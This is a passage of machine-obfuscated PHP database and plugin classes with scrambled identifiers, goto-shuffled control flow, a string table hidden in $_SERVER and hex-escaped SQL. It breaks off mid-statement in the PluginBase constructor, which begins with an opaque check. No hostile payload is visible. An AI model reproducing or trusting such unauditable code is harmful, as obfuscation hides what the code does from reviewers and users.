$e‡‚¡……‡ö < $this->numRows; $e‡‚¡……‡ö++) { $D‰™†ñÍ…˜[$e‡‚¡……‡ö] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $D‰™†ñÍ…˜; } public function getFields($D”“äáÕ…İ) { $a˜˜ØÉ¥Äã =& $_SERVER[Ç³Íß¦Ó]; $Dá±×©Æ‡ = $this->query($a˜˜ØÉ¥Äã[857] . $this->parseKey($D”“äáÕ…İ)); $FêÖğÏ‡àƒ = array(); if ($Dá±×©Æ‡) { foreach ($Dá±×©Æ‡ as $cŒƒ‰ĞÒ É => $EƒÆÔ“ßå) { $FêÖğÏ‡àƒ[$EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[27]]] = array($a˜˜ØÉ¥Äã[28] => $EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[27]], $a˜˜ØÉ¥Äã[29] => $EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[30]], $a˜˜ØÉ¥Äã[31] => (bool) ($EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[32]] === $a˜˜ØÉ¥Äã[33]), $a˜˜ØÉ¥Äã[34] => $EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[35]], $a˜˜ØÉ¥Äã[36] => strtolower($EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[37]]) == $a˜˜ØÉ¥Äã[38], $a˜˜ØÉ¥Äã[39] => strtolower($EƒÆÔ“ßå[$a˜˜ØÉ¥Äã[40]]) == $a˜˜ØÉ¥Äã[41]); } } return $FêÖğÏ‡àƒ; } public function getTables($AŞ°ÍÁä” = '') { $EÊ»Ğ—Áö =& $_SERVER[Ç³Íß¦Ó]; $F‰Ô±‹Ş¥ = !empty($AŞ°ÍÁä”) ? $EÊ»Ğ—Áö[859] . $AŞ°ÍÁä” . $EÊ»Ğ—Áö[860] : $EÊ»Ğ—Áö[861]; $f½ï¯‰º‚“ = $this->query($F‰Ô±‹Ş¥); $f°ò‹“Ã½ = array(); if ($f½ï¯‰º‚“) { foreach ($f½ï¯‰º‚“ as $F‡Şõ‚ï‚¢ => $CÉ¢°Íó±) { $f°ò‹“Ã½[$F‡Şõ‚ï‚¢] = current($CÉ¢°Íó±); } } return $f°ò‹“Ã½; } public function replace($FÆ›§÷òÎÛ, $C‡ùÛîµôÜ = array()) { $bòÖâÃ·ù =& $_SERVER[Ç³Íß¦Ó]; foreach ($FÆ›§÷òÎÛ as $AËƒ…‘³®Ø => $d™ÖÍµ¢¼ğ) { $C‹øÚ¡ÍÁ = $this->parseValue($d™ÖÍµ¢¼ğ); if (is_scalar($C‹øÚ¡ÍÁ)) { $fëï¢å±[] = $C‹øÚ¡ÍÁ; $A˜…ä¯ĞğÚ[] = $this->parseKey($AËƒ…‘³®Ø); } } $c…Úáµç©ë = $bòÖâÃ·ù[862] . $this->parseTable($C‡ùÛîµôÜ[$bòÖâÃ·ù[276]]) . $bòÖâÃ·ù[863] . implode($bòÖâÃ·ù[47], $A˜…ä¯ĞğÚ) . $bòÖâÃ·ù[864] . implode($bòÖâÃ·ù[47], $fëï¢å±) . $bòÖâÃ·ù[865]; return $this->execute($c…Úáµç©ë); } public function insertAll($eÁìêäÙŸÏ, $D¿é‰Ş©ì = array(), $aÊ‚ĞÌ©Ûï = false) { goto bêøõÏ©÷¾; aã„éîòîˆ: $díÌêÂš = array(); foreach ($eÁìêäÙŸÏ as $F·÷öˆì½ù) { $B•ÇĞèŒ = array(); foreach ($F·÷öˆì½ù as $eÓ†Œäîò => $C©Ïİ¸ÖÛæ) { $C©Ïİ¸ÖÛæ = $this->parseValue($C©Ïİ¸ÖÛæ); if (is_scalar($C©Ïİ¸ÖÛæ)) { $B•ÇĞèŒ[] = $C©Ïİ¸ÖÛæ; } } $díÌêÂš[] = $F»ñˆß¤‘«[257] . implode($F»ñˆß¤‘«[47], $B•ÇĞèŒ) . $F»ñˆß¤‘«[865]; } array_walk($cªÆ‡†®®, array($this, $F»ñˆß¤‘«[866])); goto b–„ÜŠ‹ßõ; bêøõÏ©÷¾: $F»ñˆß¤‘« =& $_SERVER[Ç³Íß¦Ó]; if (!is_array($eÁìêäÙŸÏ[0])) { return !1; } $cªÆ‡†®® = array_keys($eÁìêäÙŸÏ[0]); goto aã„éîòîˆ; b–„ÜŠ‹ßõ: $e‰§²Ï£É = $aÊ‚ĞÌ©Ûï ? $F»ñˆß¤‘«[867] : $F»ñˆß¤‘«[868]; $fÚŒ¬ó¸› = $e‰§²Ï£É . $F»ñˆß¤‘«[869] . $this->parseTable($D¿é‰Ş©ì[$F»ñˆß¤‘«[276]]) . $F»ñˆß¤‘«[863] . implode($F»ñˆß¤‘«[47], $cªÆ‡†®®) . $F»ñˆß¤‘«[870] . implode($F»ñˆß¤‘«[47], $díÌêÂš); return $this->execute($fÚŒ¬ó¸›); goto cÊšĞŸ°¯; cÊšĞŸ°¯: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e³ÙéÖæ…¾ =& $_SERVER[Ç³Íß¦Ó]; $this->error = $this->_linkID->errno . $e³ÙéÖæ…¾[4] . $this->_linkID->error; if ($e³ÙéÖæ…¾[33] != $this->queryStr) { $this->error .= LNG($e³ÙéÖæ…¾[45]) . $this->queryStr; } think_trace($this->error, $e³ÙéÖæ…¾[33], $e³ÙéÖæ…¾[46]); return $this->error; } public function escapeString($Eé‘‰ïêÒ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Eé‘‰ïêÒ); } else { return addslashes($Eé‘‰ïêÒ); } } public function parseKey(&$DØ¸ÚÌ÷¯é, $C£ÕòÈÅ¯ƒ = true) { $EÕ¦Ò§Ş‘Ø =& $_SERVER[Ç³Íß¦Ó]; if ($C£ÕòÈÅ¯ƒ) { $DØ¸ÚÌ÷¯é = $this->parseKeyCheck($DØ¸ÚÌ÷¯é); } if ($DØ¸ÚÌ÷¯é != $EÕ¦Ò§Ş‘Ø[182] && !preg_match($EÕ¦Ò§Ş‘Ø[871], $DØ¸ÚÌ÷¯é)) { $DØ¸ÚÌ÷¯é = $EÕ¦Ò§Ş‘Ø[381] . trim($DØ¸ÚÌ÷¯é, $EÕ¦Ò§Ş‘Ø[381]) . $EÕ¦Ò§Ş‘Ø[381]; } return $DØ¸ÚÌ÷¯é; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($cŒù÷×ÄÌ = '') { $f£ÔÊÅÃù =& $_SERVER[Ç³Íß¦Ó]; if (!class_exists($f£ÔÊÅÃù[873])) { think_exception(think_lang($f£ÔÊÅÃù[10]) . $f£ÔÊÅÃù[874]); } if (!empty($cŒù÷×ÄÌ)) { $this->config = $cŒù÷×ÄÌ; if (empty($this->config[$f£ÔÊÅÃù[13]])) { $this->config[$f£ÔÊÅÃù[13]] = array(); } } } public function connect($aÉÅ´Ã‘¼ = '', $e±¨ÊÙ®£ = 0) { $Cé ï§š¡ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->linkID[$e±¨ÊÙ®£])) { goto dÈ„®‰Æ¢—; eË¾¸±Öå: if (!$this->linkID[$e±¨ÊÙ®£]) { think_exception($Cé ï§š¡[883]); } try { $this->linkID[$e±¨ÊÙ®£]->exec($Cé ï§š¡[884] . think_config($Cé ï§š¡[851])); } catch (Exception $eòÍ“»’¼) { } $this->connected = !0; goto FÙõ£Ë¢©º; B»Ò„Œ„†ò: try { $this->linkID[$e±¨ÊÙ®£] = new PDO($aÉÅ´Ã‘¼[$Cé ï§š¡[875]], $aÉÅ´Ã‘¼[$Cé ï§š¡[848]], $aÉÅ´Ã‘¼[$Cé ï§š¡[849]], $aÉÅ´Ã‘¼[$Cé ï§š¡[13]]); } catch (PDOException $eòÍ“»’¼) { think_exception($eòÍ“»’¼->getMessage()); } $this->dbType = $this->_getDsnType($aÉÅ´Ã‘¼[$Cé ï§š¡[875]]); if (in_array($this->dbType, array($Cé ï§š¡[876], $Cé ï§š¡[877], $Cé ï§š¡[878], $Cé ï§š¡[879]))) { think_exception($Cé ï§š¡[880] . $this->dbType . $Cé ï§š¡[881] . $this->dbType . $Cé ï§š¡[882]); } goto eË¾¸±Öå; FÙõ£Ë¢©º: if (1 != think_config($Cé ï§š¡[18])) { unset($this->config); } goto bòåÈ¯¿Õ; dÈ„®‰Æ¢—: if (empty($aÉÅ´Ã‘¼)) { $aÉÅ´Ã‘¼ = $this->config; } $c‚µó‹ÛÂ = !empty($aÉÅ´Ã‘¼[$Cé ï§š¡[13]][$Cé ï§š¡[14]]) ? $aÉÅ´Ã‘¼[$Cé ï§š¡[13]][$Cé ï§š¡[14]] : $this->pconnect; if ($c‚µó‹ÛÂ) { $aÉÅ´Ã‘¼[$Cé ï§š¡[13]][PDO::ATTR_PERSISTENT] = !0; } goto B»Ò„Œ„†ò; bòåÈ¯¿Õ: } return $this->linkID[$e±¨ÊÙ®£]; } public function free() { $this->PDOStatement = null; } public function query($A‘Ñ«á‚ÉÖ, $c®ŠÁ—íŠä = array()) { goto F‚÷“‡Œó¯; DÜ™Œ“Ã: if (!1 === $bªç‹ğšˆ) { $this->error(); return !1; } else { return $this->getAll(); } goto A·’…‚–â…; d¬í¿¤¶î¼: $this->queryStr = $A‘Ñ«á‚ÉÖ; if (!empty($c®ŠÁ—íŠä)) { $this->queryStr .= $cêî÷Ìó¼[885] . print_r($c®ŠÁ—íŠä, !0) . $cêî÷Ìó¼[886]; } if (!empty($this->PDOStatement)) { $this->free(); } goto e“³ö¦†©; fğõà§ë¶è: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bªç‹ğšˆ = $this->PDOStatement->execute($c®ŠÁ—íŠä); $this->debug(); goto DÜ™Œ“Ã; F‚÷“‡Œó¯: $cêî÷Ìó¼ =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d¬í¿¤¶î¼; e“³ö¦†©: think_action_status($cêî÷Ìó¼[19], 1); think_status($cêî÷Ìó¼[20]); $this->PDOStatement = $this->_linkID->prepare($A‘Ñ«á‚ÉÖ); goto fğõà§ë¶è; A·’…‚–â…: } public function execute($Aè¿êšª”, $F¨´ÎÈä¸¥ = array()) { goto BÍŸ§ŠÂÌ§; BÍŸ§ŠÂÌ§: $B†¿Ğ‘íÑ· =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B×â¶¨š; F¨à£ğ¤É½: $fÅ¿¿Æ÷ë = $this->PDOStatement->execute($F¨´ÎÈä¸¥); $this->debug(); if (!1 === $fÅ¿¿Æ÷ë) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Dæ¼ŸÂ†Á || preg_match($B†¿Ğ‘íÑ·[891], $Aè¿êšª”)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Fªˆƒ„²æÉ; B×â¶¨š: $this->queryStr = $Aè¿êšª”; if (!empty($F¨´ÎÈä¸¥)) { $this->queryStr .= $B†¿Ğ‘íÑ·[885] . print_r($F¨´ÎÈä¸¥, !0) . $B†¿Ğ‘íÑ·[886]; } $Dæ¼ŸÂ†Á = !1; goto F˜Ã´À†Ç÷; F˜Ã´À†Ç÷: if ($this->dbType == $B†¿Ğ‘íÑ·[879]) { if (preg_match($B†¿Ğ‘íÑ·[887], $this->queryStr, $fòá¹òŞ‰Ç)) { $this->table = think_config($B†¿Ğ‘íÑ·[888]) . str_ireplace(think_config($B†¿Ğ‘íÑ·[889]), $B†¿Ğ‘íÑ·[374], $fòá¹òŞ‰Ç[2]); $Dæ¼ŸÂ†Á = (bool) $this->query($B†¿Ğ‘íÑ·[890] . strtoupper($this->table) . $B†¿Ğ‘íÑ·[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($B†¿Ğ‘íÑ·[21], 1); goto A²â ™Ì“‚; A²â ™Ì“‚: think_status($B†¿Ğ‘íÑ·[20]); $this->PDOStatement = $this->_linkID->prepare($Aè¿êšª”); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto F¨à£ğ¤É½; Fªˆƒ„²æÉ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fè„¾¥ªÖÅ = $this->_linkID->commit(); $this->transTimes = 0; if (!$fè„¾¥ªÖÅ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÓÎŒç‡øŞ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BÓÎŒç‡øŞ) { $this->error(); return !1; } } return !0; } private function getAll() { $C•Ã¡ƒ„¼İ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($C•Ã¡ƒ„¼İ); return $C•Ã¡ƒ„¼İ; } public function getFields($Añ½Â¯§Éá) { goto e¼áÇÔ‘²ï; e¼áÇÔ‘²ï: $e £õ›ºèÌ =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!0); if (think_config($e £õ›ºèÌ[892])) { $F¼ŠçÀíì = str_replace($e £õ›ºèÌ[893], $Añ½Â¯§Éá, think_config($e £õ›ºèÌ[892])); } else { switch ($this->dbType) { case $e £õ›ºèÌ[876]: case $e £õ›ºèÌ[894]: $F¼ŠçÀíì = "\123\x45\114\x45\103\x54\40\40\40\x63\157\x6c\x75\155\x6e\137\x6e\x61\155\x65\40\141\x73\x20\x27\x4e\x61\x6d\x65\x27\54\40\x20\40\144\141\164\x61\137\x74\171\x70\145\x20\141\163\40\x27\124\171\x70\145\x27\54\x20\x20\x20\143\x6f\x6c\x75\155\x6e\x5f\x64\x65\146\141\165\x6c\164\40\141\163\40\47\104\145\146\x61\x75\154\x74\47\54\x20\x20\40\x69\163\x5f\x6e\x75\154\154\x61\142\x6c\x65\40\x61\163\x20\47\x4e\x75\x6c\x6c\x27\xa\x9\11\106\x52\117\x4d\x9\x69\156\x66\x6f\x72\155\141\164\x69\x6f\156\137\x73\x63\x68\x65\x6d\141\56\164\141\142\154\145\x73\40\x41\123\x20\x74\12\11\x9\112\x4f\111\116\11\151\x6e\x66\x6f\x72\x6d\x61\164\x69\x6f\156\x5f\163\143\150\x65\x6d\141\56\143\x6f\154\x75\x6d\156\x73\40\x41\x53\40\x63\12\x9\x9\x4f\x4e\x20\x20\164\56\164\141\142\154\145\x5f\143\x61\164\141\x6c\x6f\147\x20\x3d\40\x63\56\164\x61\142\154\x65\x5f\x63\141\164\x61\x6c\x6f\x67\xa\x9\x9\x41\x4e\x44\x20\x74\x2e\x74\x61\x62\x6c\145\137\163\143\x68\x65\155\141\x20\75\40\x63\56\x74\141\142\x6c\145\137\x73\x63\150\145\155\141\12\x9\11\101\116\x44\40\x74\56\x74\x61\142\x6c\x65\137\x6e\x61\x6d\145\x20\x3d\40\143\x2e\164\141\x62\154\145\137\156\x61\x6d\x65\xa\11\x9\x57\110\x45\x52\x45\x20\x20\40\164\56\164\x61\142\x6c\145\137\x6e\x61\155\145\40\75\x20\x27{$Añ½Â¯§Éá}\x27"; break; case $e £õ›ºèÌ[895]: $F¼ŠçÀíì = $e £õ›ºèÌ[896] . $Añ½Â¯§Éá . $e £õ›ºèÌ[897]; break; case $e £õ›ºèÌ[877]: case $e £õ›ºèÌ[879]: $F¼ŠçÀíì = $e £õ›ºèÌ[898] . $e £õ›ºèÌ[899] . $e £õ›ºèÌ[900] . strtoupper($Añ½Â¯§Éá) . $e £õ›ºèÌ[901] . strtoupper($Añ½Â¯§Éá) . $e £õ›ºèÌ[902]; break; case $e £õ›ºèÌ[903]: $F¼ŠçÀíì = $e £õ›ºèÌ[904] . $Añ½Â¯§Éá . $e £õ›ºèÌ[905]; break; case $e £õ›ºèÌ[878]: break; case $e £õ›ºèÌ[906]: default: $F¼ŠçÀíì = $e £õ›ºèÌ[907] . ($this->dbType == $e £õ›ºèÌ[906] ? "\x60{$Añ½Â¯§Éá}\140" : $Añ½Â¯§Éá); } } goto Fñä‘­¢ğ; a ÷“Œ³©¬: return $Fì Üñ®±ƒ; goto E‰ÎœÜÇÃ×; Fñä‘­¢ğ: $aŒçôµæ¡¶ = $this->query($F¼ŠçÀíì); $Fì Üñ®±ƒ = array(); if ($aŒçôµæ¡¶) { foreach ($aŒçôµæ¡¶ as $f’¨„«’Åê => $eİêë­‰Ç) { $eİêë­‰Ç = array_change_key_case($eİêë­‰Ç); $eİêë­‰Ç[$e £õ›ºèÌ[28]] = isset($eİêë­‰Ç[$e £õ›ºèÌ[28]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[28]] : $e £õ›ºèÌ[374]; $eİêë­‰Ç[$e £õ›ºèÌ[29]] = isset($eİêë­‰Ç[$e £õ›ºèÌ[29]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[29]] : $e £õ›ºèÌ[374]; $D‘ŠÊåïÏ® = isset($eİêë­‰Ç[$e £õ›ºèÌ[270]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[270]] : $eİêë­‰Ç[$e £õ›ºèÌ[28]]; $Fì Üñ®±ƒ[$D‘ŠÊåïÏ®] = array($e £õ›ºèÌ[28] => $D‘ŠÊåïÏ®, $e £õ›ºèÌ[29] => $eİêë­‰Ç[$e £õ›ºèÌ[29]], $e £õ›ºèÌ[31] => (bool) (isset($eİêë­‰Ç[$e £õ›ºèÌ[103]]) && $eİêë­‰Ç[$e £õ›ºèÌ[103]] === $e £õ›ºèÌ[33] || isset($eİêë­‰Ç[$e £õ›ºèÌ[31]]) && $eİêë­‰Ç[$e £õ›ºèÌ[31]] === $e £õ›ºèÌ[33]), $e £õ›ºèÌ[34] => isset($eİêë­‰Ç[$e £õ›ºèÌ[34]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[34]] : (isset($eİêë­‰Ç[$e £õ›ºèÌ[53]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[53]] : $e £õ›ºèÌ[374]), $e £õ›ºèÌ[36] => isset($eİêë­‰Ç[$e £õ›ºèÌ[93]]) ? strtolower($eİêë­‰Ç[$e £õ›ºèÌ[93]]) == $e £õ›ºèÌ[38] : (isset($eİêë­‰Ç[$e £õ›ºèÌ[54]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[54]] : !1), $e £õ›ºèÌ[39] => isset($eİêë­‰Ç[$e £õ›ºèÌ[908]]) ? strtolower($eİêë­‰Ç[$e £õ›ºèÌ[908]]) == $e £õ›ºèÌ[41] : (isset($eİêë­‰Ç[$e £õ›ºèÌ[93]]) ? $eİêë­‰Ç[$e £õ›ºèÌ[93]] : !1)); } } goto a ÷“Œ³©¬; E‰ÎœÜÇÃ×: } public function getTables($d¸½æÔ°ÇÑ = '') { $ağ¥ï¥ìÔ¬ =& $_SERVER[Ç³Íß¦Ó]; if (think_config($ağ¥ï¥ìÔ¬[909])) { $DŒĞÄØãøŒ = str_replace($ağ¥ï¥ìÔ¬[910], $d¸½æÔ°ÇÑ, think_config($ağ¥ï¥ìÔ¬[909])); } else { switch ($this->dbType) { case $ağ¥ï¥ìÔ¬[877]: case $ağ¥ï¥ìÔ¬[879]: $DŒĞÄØãøŒ = $ağ¥ï¥ìÔ¬[911]; break; case $ağ¥ï¥ìÔ¬[876]: case $ağ¥ï¥ìÔ¬[894]: $DŒĞÄØãøŒ = $ağ¥ï¥ìÔ¬[912]; break; case $ağ¥ï¥ìÔ¬[903]: $DŒĞÄØãøŒ = $ağ¥ï¥ìÔ¬[913]; break; case $ağ¥ï¥ìÔ¬[878]: think_exception(think_lang($ağ¥ï¥ìÔ¬[914]) . $ağ¥ï¥ìÔ¬[915]); break; case $ağ¥ï¥ìÔ¬[895]: $DŒĞÄØãøŒ = $ağ¥ï¥ìÔ¬[42] . $ağ¥ï¥ìÔ¬[43] . $ağ¥ï¥ìÔ¬[44]; break; case $ağ¥ï¥ìÔ¬[906]: default: if (!empty($d¸½æÔ°ÇÑ)) { $DŒĞÄØãøŒ = $ağ¥ï¥ìÔ¬[859] . $d¸½æÔ°ÇÑ . $ağ¥ï¥ìÔ¬[860]; } else { $DŒĞÄØãøŒ = $ağ¥ï¥ìÔ¬[861]; } } } $fÕ‡‰ïİ„ = $this->query($DŒĞÄØãøŒ); $dÅ°ôó¨Î• = array(); foreach ($fÕ‡‰ïİ„ as $cÃœ©ÓİŞô => $d–Ğ¤Öğ) { $dÅ°ôó¨Î•[$cÃœ©ÓİŞô] = current($d–Ğ¤Öğ); } return $dÅ°ôó¨Î•; } protected function parseLimit($b˜ŠöÔÅ³) { $E°ßÒæ­Ì =& $_SERVER[Ç³Íß¦Ó]; $BŒÙìŒÌÀ = $E°ßÒæ­Ì[33]; if (!empty($b˜ŠöÔÅ³)) { switch ($this->dbType) { case $E°ßÒæ­Ì[903]: case $E°ßÒæ­Ì[895]: $b˜ŠöÔÅ³ = explode($E°ßÒæ­Ì[47], $b˜ŠöÔÅ³); if (count($b˜ŠöÔÅ³) > 1) { $BŒÙìŒÌÀ .= $E°ßÒæ­Ì[48] . $b˜ŠöÔÅ³[1] . $E°ßÒæ­Ì[49] . $b˜ŠöÔÅ³[0] . $E°ßÒæ­Ì[50]; } else { $BŒÙìŒÌÀ .= $E°ßÒæ­Ì[48] . $b˜ŠöÔÅ³[0] . $E°ßÒæ­Ì[50]; } break; case $E°ßÒæ­Ì[876]: case $E°ßÒæ­Ì[894]: break; case $E°ßÒæ­Ì[878]: break; case $E°ßÒæ­Ì[877]: case $E°ßÒæ­Ì[879]: break; case $E°ßÒæ­Ì[906]: default: $BŒÙìŒÌÀ .= $E°ßÒæ­Ì[48] . $b˜ŠöÔÅ³ . $E°ßÒæ­Ì[50]; } } return $BŒÙìŒÌÀ; } public function parseKey(&$bÔ“–’‘¸¼, $DÒ˜•µ± = true) { $CÒÑÁÔ»• =& $_SERVER[Ç³Íß¦Ó]; if ($DÒ˜•µ±) { $bÔ“–’‘¸¼ = $this->parseKeyCheck($bÔ“–’‘¸¼); } if ($this->dbType == $CÒÑÁÔ»•[906]) { if ($bÔ“–’‘¸¼ != $CÒÑÁÔ»•[182] && !preg_match($CÒÑÁÔ»•[871], $bÔ“–’‘¸¼)) { $bÔ“–’‘¸¼ = $CÒÑÁÔ»•[381] . trim($bÔ“–’‘¸¼, $CÒÑÁÔ»•[381]) . $CÒÑÁÔ»•[381]; } return $bÔ“–’‘¸¼; } else { return parent::parseKey($bÔ“–’‘¸¼, $DÒ˜•µ±); } } public function close() { $this->_linkID = null; } public function error() { $EšõÊ’¼Å³ =& $_SERVER[Ç³Íß¦Ó]; if ($this->PDOStatement) { $bÔŞ×¾ùåÁ = $this->PDOStatement->errorInfo(); $this->error = $bÔŞ×¾ùåÁ[1] . $EšõÊ’¼Å³[4] . $bÔŞ×¾ùåÁ[2]; } else { $this->error = $EšõÊ’¼Å³[33]; } if ($EšõÊ’¼Å³[33] != $this->queryStr) { $this->error .= LNG($EšõÊ’¼Å³[45]) . $this->queryStr; } think_trace($this->error, $EšõÊ’¼Å³[33], $EšõÊ’¼Å³[46]); return $this->error; } public function escapeString($b¢­ë®˜‰æ) { $c…ô¬ô‰…® =& $_SERVER[Ç³Íß¦Ó]; switch ($this->dbType) { case $c…ô¬ô‰…®[903]: case $c…ô¬ô‰…®[876]: case $c…ô¬ô‰…®[894]: case $c…ô¬ô‰…®[906]: return addslashes($b¢­ë®˜‰æ); case $c…ô¬ô‰…®[878]: case $c…ô¬ô‰…®[895]: case $c…ô¬ô‰…®[877]: case $c…ô¬ô‰…®[879]: return str_ireplace($c…ô¬ô‰…®[55], $c…ô¬ô‰…®[56], $b¢­ë®˜‰æ); } } protected function parseValue($aËö¹æõÀ) { $cÏõĞŠ–¾¡ =& $_SERVER[Ç³Íß¦Ó]; if (is_string($aËö¹æõÀ)) { $CéºÕİ»ÊÇ = strpos($aËö¹æõÀ, $cÏõĞŠ–¾¡[4]) === 0 && in_array($aËö¹æõÀ, array_keys($this->bind)); $aËö¹æõÀ = $CéºÕİ»ÊÇ ? $this->escapeString($aËö¹æõÀ) : $cÏõĞŠ–¾¡[916] . $this->escapeString($aËö¹æõÀ) . $cÏõĞŠ–¾¡[916]; } elseif (isset($aËö¹æõÀ[0]) && is_string($aËö¹æõÀ[0]) && strtolower($aËö¹æõÀ[0]) == $cÏõĞŠ–¾¡[294]) { $aËö¹æõÀ = $this->escapeString($aËö¹æõÀ[1]); } elseif (is_array($aËö¹æõÀ)) { $aËö¹æõÀ = array_map(array($this, $cÏõĞŠ–¾¡[917]), $aËö¹æõÀ); } elseif (is_bool($aËö¹æõÀ)) { $aËö¹æõÀ = $aËö¹æõÀ ? $cÏõĞŠ–¾¡[87] : $cÏõĞŠ–¾¡[495]; } elseif (is_null($aËö¹æõÀ)) { $aËö¹æõÀ = $cÏõĞŠ–¾¡[103]; } return $aËö¹æõÀ; } public function getLastInsertId() { $Aø•ÚÀÆÚÜ =& $_SERVER[Ç³Íß¦Ó]; switch ($this->dbType) { case $Aø•ÚÀÆÚÜ[903]: case $Aø•ÚÀÆÚÜ[895]: case $Aø•ÚÀÆÚÜ[876]: case $Aø•ÚÀÆÚÜ[894]: case $Aø•ÚÀÆÚÜ[878]: case $Aø•ÚÀÆÚÜ[906]: return $this->_linkID->lastInsertId(); case $Aø•ÚÀÆÚÜ[877]: case $Aø•ÚÀÆÚÜ[879]: $cÆ÷Ì¥„ß = $this->table; $cÏå·‡ÒÏñ = $this->query("\x53\x45\114\x45\103\124\x20{$cÆ÷Ì¥„ß}\x2e\x63\x75\x72\x72\x76\141\x6c\x20\x63\x75\162\x72\x76\141\154\x20\x46\122\117\115\40\x64\x75\x61\x6c"); return $cÏå·‡ÒÏñ ? $cÏå·‡ÒÏñ[0][$Aø•ÚÀÆÚÜ[918]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($bè‘æÈèÖ”) { $B‰¬¡Ùäˆ³ =& $_SERVER[Ç³Íß¦Ó]; if (!CacheLock::fileLock($B‰¬¡Ùäˆ³[9])) { return !1; } $fôÌĞ‹¡ëª = parent::query($bè‘æÈèÖ”); CacheLock::fileUnLock($B‰¬¡Ùäˆ³[9]); return $fôÌĞ‹¡ëª; } public function execute($E—ËØÙ¸é¶) { $F¸¸¤•î¦ø =& $_SERVER[Ç³Íß¦Ó]; if (!CacheLock::fileLock($F¸¸¤•î¦ø[9])) { return !1; } $f¿œ’£‘î = parent::execute($E—ËØÙ¸é¶); CacheLock::fileUnLock($F¸¸¤•î¦ø[9]); return $f¿œ’£‘î; } } goto d¹ïÛ†¾­ƒ; bµ°·Ñ«ÒÌ: class Message { function __construct() { } public function send($DÔõï®íŠÚ = '', $BÊîãìĞ¹ˆ = array(), $F¥¿¢«ù›Ï = "\164\145\x78\164") { goto bˆïƒÛÃÆ­; föË Ûòø«: $BÊîãìĞ¹ˆ = array($A§«ç×Ûí»[1015] => isset($BÊîãìĞ¹ˆ[$A§«ç×Ûí»[1015]]) ? $BÊîãìĞ¹ˆ[$A§«ç×Ûí»[1015]] : $A§«ç×Ûí»[33], $A§«ç×Ûí»[561] => isset($BÊîãìĞ¹ˆ[$A§«ç×Ûí»[561]]) ? $BÊîãìĞ¹ˆ[$A§«ç×Ûí»[561]] : $A§«ç×Ûí»[33]); if (empty($DÔõï®íŠÚ) || empty($BÊîãìĞ¹ˆ[$A§«ç×Ûí»[1015]]) && empty($BÊîãìĞ¹ˆ[$A§«ç×Ûí»[561]])) { return !1; } $eºïÊÔÂ‚Š = array($A§«ç×Ûí»[1333] => $F¬…Ë‚Ùƒ©, $A§«ç×Ûí»[1396] => $BÊîãìĞ¹ˆ); goto dËœ›„¯Çõ; dËœ›„¯Çõ: Hook::trigger($A§«ç×Ûí»[1397], $eºïÊÔÂ‚Š); goto cœ£­§ä¹Û; bˆïƒÛÃÆ­: $A§«ç×Ûí» =& $_SERVER[Ç³Íß¦Ó]; $F¬…Ë‚Ùƒ© = array($A§«ç×Ûí»[29] => $A§«ç×Ûí»[1394], $A§«ç×Ûí»[717] => $DÔõï®íŠÚ); if (in_array($F¥¿¢«ù›Ï, array($A§«ç×Ûí»[1394], $A§«ç×Ûí»[1395]))) { $F¬…Ë‚Ùƒ©[$A§«ç×Ûí»[29]] = $F¥¿¢«ù›Ï; } goto föË Ûòø«; cœ£­§ä¹Û: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Då¤í¾—«; bºê³›¦Ãé: return $this; goto D·‘°ö¼Æé; eÅ¥Õ×ğš: $this->pluginName = str_replace($Bíô›ëßë«[1399], $Bíô›ëßë«[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Bíô›ëßë«[8]; $this->pluginApi = appHostGet() . $Bíô›ëßë«[1400] . $this->pluginName . $Bíô›ëßë«[8]; goto cá§Í·»±Î; aœ‘É‚òš©: if ($eÎ–É±íË && strpos($Bíô›ëßë«[47] . $eÎ–É±íË . $Bíô›ëßë«[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Bíô›ëßë«[1403]] . $this->pluginName . $Bíô›ëßë«[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto bºê³›¦Ãé; Då¤í¾—«: $Bíô›ëßë« =& $_SERVER[Ç³Íß¦Ó]; if ($_SERVER[$Bíô›ëßë«[834]] != $_SERVER[$Bíô›ëßë«[1392]]) { goto d¢†²ææõƒ; FÔô“Ê‡èæ: $c¹¹Ö‰Ì = 1; while ($c¹¹Ö‰Ì > 1) { $c¹¹Ö‰Ì = $c¹¹Ö‰Ì + 4; $CòÛàßÈ­Ù = rawurlencode($c¹¹Ö‰Ì . $Bíô›ëßë«[374]); } goto 